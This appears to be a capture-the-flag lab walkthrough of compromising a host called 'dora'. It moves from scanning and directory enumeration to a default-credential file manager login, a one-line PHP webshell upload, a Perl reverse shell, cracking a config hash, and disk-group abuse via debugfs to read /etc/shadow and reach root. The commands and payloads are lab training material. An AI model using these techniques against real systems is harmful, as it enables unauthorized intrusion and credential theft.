`Running all scans on 192.168.151.16`

`Host is likely running Unknown OS!`

`---------------------Starting Port Scan-----------------------`

`PORT   STATE SERVICE`
`22/tcp open  ssh`
`80/tcp open  http`

`└─$ gobuster dir -u http://192.168.190.16 -w /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt` 
===============================================================
`Gobuster v3.6`
`by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)`
===============================================================
`[+] Url:                     http://192.168.190.16`
`[+] Method:                  GET`
`[+] Threads:                 10`
`[+] Wordlist:                /usr/share/seclists/Discovery/Web-Content/raft-medium-words.txt`
`[+] Negative Status codes:   404`
`[+] User Agent:              gobuster/3.6`
`[+] Timeout:                 10s`
===============================================================
`Starting gobuster in directory enumeration mode`
===============================================================
`/.html                (Status: 403) [Size: 279]`
`/.php                 (Status: 403) [Size: 279]`
`/wp-admin             (Status: 301) [Size: 319] [--> http://192.168.190.16/wp-admin/]`
`/wp-includes          (Status: 301) [Size: 322] [--> http://192.168.190.16/wp-includes/]`
`/wp-content           (Status: 301) [Size: 321] [--> http://192.168.190.16/wp-content/]`
`/.htm                 (Status: 403) [Size: 279]`
`/.                    (Status: 302) [Size: 0] [--> http://192.168.190.16/wp-admin/setup-config.php]`
`/wordpress            (Status: 301) [Size: 320] [--> http://192.168.190.16/wordpress/]`
`/.htaccess            (Status: 403) [Size: 279]`
`/.phtml               (Status: 403) [Size: 279]`
`/.htc                 (Status: 403) [Size: 279]`
`/filemanager          (Status: 301) [Size: 322] [--> http://192.168.190.16/filemanager/]`

Let's check out the filemanager

Weak credentials admin:admin gets us in

We get a popup to change our password or dora's. Tried to change dora's password but it doesn't work for ssh, only for this web console, so it's kind of worthless.

Upload a basic webshell
`└─$ cat basic_webshell.php`                
`<?php system($_GET['cmd']);?>`

Upload our perl reverse shell from pentest monkey
http://pentestmonkey.net/tools/perl-reverse-shell/perl-reverse-shell-1.0.tar.gz

![[Pasted image 20240211115234.png]]

Catch and upgrade
`└─$ nc -nlvp 1234`
`Ncat: Version 7.94SVN ( https://nmap.org/ncat )`
`Ncat: Listening on [::]:1234`
`Ncat: Listening on 0.0.0.0:1234`
`Ncat: Connection from 192.168.190.16:56804.`
 `16:52:42 up 13 min,  0 users,  load average: 0.00, 0.00, 0.00`
`USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT`
`Linux dora 5.4.0-146-generic #163-Ubuntu SMP Fri Mar 17 18:26:02 UTC 2023 x86_64 x86_64 x86_64 GNU/Linux`
`uid=33(www-data) gid=33(www-data) groups=33(www-data)`
`/`
`/usr/sbin/apache: 0: can't access tty; job control turned off`
`$ python3 -c 'import pty; pty.spawn("/bin/bash")'`

Look to see if there is another user we probably have to switch to
`www-data@dora:/$ cd /home`
`cd /home`
`www-data@dora:/home$ ls`
`ls`
`dora`

See if there is anything we missed in our file manager
`www-data@dora:/$ cd /var/www/html`
`cd /var/www/html`
Check if any files contain the user ID we're looking for 
`www-data@dora:/var/www/html$ find . -type f -exec grep -H "dora" {} + 2>/dev/null`

The last result is interesting
`./filemanager/config/.htusers.php:	array('dora','$2a$08$zyiNvVoP/UuSMgO2rKDtLuox.vYj.3hZPVYq3i4oG3/CtgET7CjjS','/var/www/html','http://localhost','1','','0',1),`

If we run this through hashcat, it cracks it to doraemon

Switch users
`www-data@dora:/var/www/html$ su dora`
`su dora`
`Password: doraemon`

`$ python3 -c 'import pty; pty.spawn("/bin/bash")'`

`dora@dora:/var/www/html$` 

Dora is a member of the disk grou
`dora@dora:/var/www/html$ id`
`id`
`uid=1000(dora) gid=1000(dora) groups=1000(dora),6(disk)`

We can privilege escalate with disk group membership as found on this page
https://steflan-security.com/linux-privilege-escalation-exploiting-user-groups/

`dora@dora:/var/www/html$ df -h`  
`df -h`
`Filesystem                         Size  Used Avail Use% Mounted on`
`/dev/mapper/ubuntu--vg-ubuntu--lv  9.8G  5.1G  4.3G  55% /`
`udev                               947M     0  947M   0% /dev`
`tmpfs                              992M     0  992M   0% /dev/shm`
`tmpfs                              199M  1.2M  198M   1% /run`
`tmpfs                              5.0M     0  5.0M   0% /run/lock`
`tmpfs                              992M     0  992M   0% /sys/fs/cgroup`
`/dev/sda2                          1.7G  209M  1.4G  13% /boot`
`/dev/loop0                          62M   62M     0 100% /snap/core20/1611`
`/dev/loop3                          50M   50M     0 100% /snap/snapd/18596`
`/dev/loop2                          68M   68M     0 100% /snap/lxd/22753`
`/dev/loop1                          64M   64M     0 100% /snap/core20/1852`
`/dev/loop4                          92M   92M     0 100% /snap/lxd/24061`
`tmpfs                              199M     0  199M   0% /run/user/1000`
`dora@dora:/var/www/html$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv`
`debugfs /dev/mapper/ubuntu--vg-ubuntu--lv`
`debugfs 1.45.5 (07-Jan-2020)`
`debugfs:`  

Once we can read the filesystem, check the /etc/shadow file
`dora@dora:/$ debugfs /dev/mapper/ubuntu--vg-ubuntu--lv`
`debugfs /dev/mapper/ubuntu--vg-ubuntu--lv`
`debugfs 1.45.5 (07-Jan-2020)`
`debugfs:  cat /etc/shadow`
`cat /etc/shadow`
`root:$6$AIWcIr8PEVxEWgv1$3mFpTQAc9Kzp4BGUQ2sPYYFE/dygqhDiv2Yw.XcU.Q8n1YO05.a/4.D/x4ojQAkPnv/v7Qrw7Ici7.hs0sZiC.:19453:0:99999:7:::`

Run this through hashcat and we get "explorer"

Privilege escalate and get the flag
`dora@dora:/$ su root`
`su root`
`Password: explorer`

`root@dora:/# cat /root/proof.txt`
`cat /root/proof.txt`
`759aaf1cb811b6503d2f0e54d9984ff1`
